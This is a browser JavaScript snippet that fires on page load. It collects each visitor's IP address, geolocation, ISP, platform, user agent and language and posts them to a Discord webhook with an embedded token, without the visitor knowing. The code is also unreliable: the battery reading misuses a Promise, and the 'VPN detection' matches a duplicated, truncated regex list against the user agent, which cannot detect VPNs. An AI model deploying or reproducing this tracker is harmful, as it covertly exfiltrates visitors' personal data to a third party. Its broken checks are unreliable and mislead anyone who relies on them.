    async function sendUserDataToDiscord() {
        try {
            // Fetch user data from json.geoiplookup.io
            const response = await fetch('https://json.geoiplookup.io');
            const userData = await response.json();

            // Get device, browser, and battery information
            const deviceInfo = {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                language: navigator.language,
                battery: navigator.getBattery ? navigator.getBattery().level * 100 : null,
            };

            // Check if VPN is being used
            const isVPN = checkForVPN();

            // Construct the message content
            const messageContent = `
                **User Data:**
                - IP Address: ${userData.ip}
                - Country: ${userData.country_name}
                - Region: ${userData.region}
                - City: ${userData.city}
                - ISP: ${userData.isp}
                - Device: ${deviceInfo.platform}
                - Browser: ${deviceInfo.userAgent}
                - Language: ${deviceInfo.language}
                - Battery: ${deviceInfo.battery}%
                - VPN: ${isVPN ? 'Yes' : 'No'}
            `;

            // Send the user data to Discord webhook
            const webhookURL = 'https://discord.com/api/webhooks/1220786784426922025/OXXd7xO_wT8mc48DTBIJ2tDY45OyH8X5pPllvaR8RY65SJlpp8lRlj45QHO1j9OjfnL-'; // Replace with your Discord webhook URL
            const payload = {
                content: messageContent
            };

            await fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            });

            console.log('User data sent to Discord successfully');
        } catch (error) {
            console.error('Error sending user data to Discord:', error);
        }
    }

    // Check if VPN is being used
    function checkForVPN() {
        const vpnPatterns = [
            /vpn\.*/i,
            /torguard\.*/i,
            /cyberghost\.*/i,
            /expressvpn\.*/i,
            /nordvpn\.*/i,
            /ipvanish\.*/i,
            /hidemyass\.*/i,
            /hotspotshield\.*/i,
            /privateinternetaccess\.*/i,
            /protonvpn\.*/i,
            /vpnbook\.*/i,
            /vpntunnel\.*/i,
            /vpnunlimited\.*/i,
            /windscribe\.*/i,
            /zpn\.*/i,
            /tunnelbear\.*/i,
            /safervpn\.*/i,
            /bufferedvpn\.*/i,
            /speedify\.*/i,
            /vpnarea\.*/i,
            /vpnjack\.*/i,
            /vpnranks\.*/i,
            /vpntest\.*/i,
            /vpnuniversity\.*/i,
            /vpnmentor\.*/i,
            /vpnboss\.*/i,
            /vpntor\.*/i,
           /vpnroute\.*/i,
            /vpnsecure\.*/i,
            /vpnmonster\.*/i,
            /vpnhub\.*/i,
            /vpnbrowser\.*/i,
            /vpnsurf\.*/i,
            /vpnbook\.*/i,
            /vpnsecureme\.*/i,
            /vpnprivate\.*/i,
            /vpnpro\.*/i,
            /vpnhub\.*/i,
            /vpncheap\.*/i,
            /vpnreview\.*/i,
            /vpnmaster\.*/i,
            /vpnbeast\.*/i,
            /vpnbase\.*/i,
            /vpnbridge\.*/i,
            /vpnpoint\.*/i,
            /vpntrial\.*/i,
            /vpnunlim\.*/i,
            /vpnpal\.*/i,
            /vpnplanet\.*/i,
            /vpnprofi\.*/i,
            /vpnspot\.*/i,
            /vpnstar\.*/i,
            /vpnstarz\.*/i,
            /vpnstuff\.*/i,
            /vpnstone\.*/i,
            /vpnswitch\.*/i,
            /vpntrust\.*/i,
            /vpnworld\.*/i,
            /vpnzilla\.*/i,
            /vpnzee\.*/i,
            /vpnzoo\.*/i,
            /vpn\.sh\.*/i,
            /torproject\.*/i,
            /whoer\.*/i,
            /proxynova\.*/i,
            /proxymule\.*/i,
            /proxysite\.*/i,
            /proxyspace\.*/i,
            /proxylite\.*/i,
            /proxyfree\.*/i,
            /proxybit\.*/i,
            /proxyninja\.*/i,
            /proxypublic\.*/i,
            /proxyserver\.*/i,
            /proxystream\.*/i,
            /proxylist\.*/i,
            /proxy\.web\.*/i,
            /proxy\.org\.*/i,
            /proxy\.info\.*/i,
            /proxy\.cz\.*/i,
            /proxy\.to\.*/i,
            /proxy\.si\.*/i,
            /proxy\.sk\.*/i,
            /proxy\.at\.*/i,
            /proxy\.be\.*/i,
            /proxy\.ch\.*/i,
            /proxy\.cl\.*/i,
            /proxy\.co\.*/i,
            /proxy\.com\.*/i,
            /proxy\.de\.*/i,
            /proxy\.es\.*/i,
            /proxy\.eu\.*/i,
            /proxy\.fr\.*/i,
            /proxy\.gr\.*/i,
            /proxy\.hu\.*/i,
            /proxy\.ie\.*/i,
            /proxy\.in\.*/i,
            /proxy\.is\.*/i,
            /proxy\.it\.*/i,
            /proxy\.jp\.*/i,
            /proxy\.kr\.*/i,
            /proxy\.li\.*/i,
            /proxy\.lt\.*/i,
            /proxy\.lu\.*/i,
            /proxy\.md\.*/i,
            /proxy\.me\.*/i,
            /proxy\.nl\.*/i,
            /proxy\.no\.*/i,
            /proxy\.pl\.*/i,
            /proxy\.pt\.*/i,
            /proxy\.ro\.*/i,
            /proxy\.ru\.*/i,
            /proxy\.se\.*/i,
            /proxy\.sg\.*/i,
            /proxy\.si\.*/i,
            /proxy\.th\.*/i,
            /proxy\.tr\.*/i,
            /proxy\.tw\.*/i,
            /proxy\.ua\.*/i,
            /proxy\.us\.*/i,
            /proxy\.vg\.*/i,
            /proxy\.ws\.*/i,
            /proxy\.ye\.*/i,
            /proxy\.za\.*/i,
            /proxy\.to\.*/i,
            /proxy\.cz\.*/i,
            /proxy\.sk\.*/i,
            /proxy\.at\.*/i,
            /proxy\.be\.*/i,
            /proxy\.ch\.*/i,
            /proxy\.cl\.*/i,
            /proxy\.co\.*/i,
            /proxy\.com\.*/i,
            /proxy\.de\.*/i,
            /proxy\.es\.*/i,
            /proxy\.eu\.*/i,
            /proxy\.fr\.*/i,
            /proxy\.gr\.*/i,
            /proxy\.hu\.*/i,
            /proxy\.ie\.*/i,
            /proxy\.in\.*/i,
            /proxy\.is\.*/i,
            /proxy\.it\.*/i,
            /proxy\.jp\.*/i,
            /proxy\.kr\.*/i,
            /proxy\.li\.*/i,
            /proxy\.lt\.*/i,
            /proxy\.lu\.*/i,
            /proxy\.md\.*/i,
            /proxy\.me\.*/i,
            /proxy\.nl\.*/i,
            /proxy\.no\.*/i,
            /proxy\.pl\.*/i,
            /proxy\.pt\.*/i,
            /proxy\.ro\.*/i,
            /proxy\.ru\.*/i,
            /proxy\.se\.*/i,
           /proxy\.sg\.*/i,
            /proxy\.si\.*/i,
            /proxy\.th\.*/i,
            /proxy\.tr\.*/i,
            /proxy\.tw\.*/i,
            /proxy\.ua\.*/i,
            /proxy\.us\.*/i,
            /proxy\.vg\.*/i,
            /proxy\.ws\.*/i,
            /proxy\.ye\.*/i,
            /proxy\.za\.*/i,
            /proxy\.to\.*/i,
            /proxy\.cz\.*/i,
            /proxy\.sk\.*/i,
            /proxy\.at\.*/i,
            /proxy\.be\.*/i,
            /proxy\.ch\.*/i,
            /proxy\.cl\.*/i,
            /proxy\.co\.*/i,
            /proxy\.com\./
        ];
      
        for (const pattern of vpnPatterns) {
            if (pattern.test(navigator.userAgent.toLowerCase())) {
                return true;
            }
        }

        return false;
    }

    window.addEventListener('load', sendUserDataToDiscord);
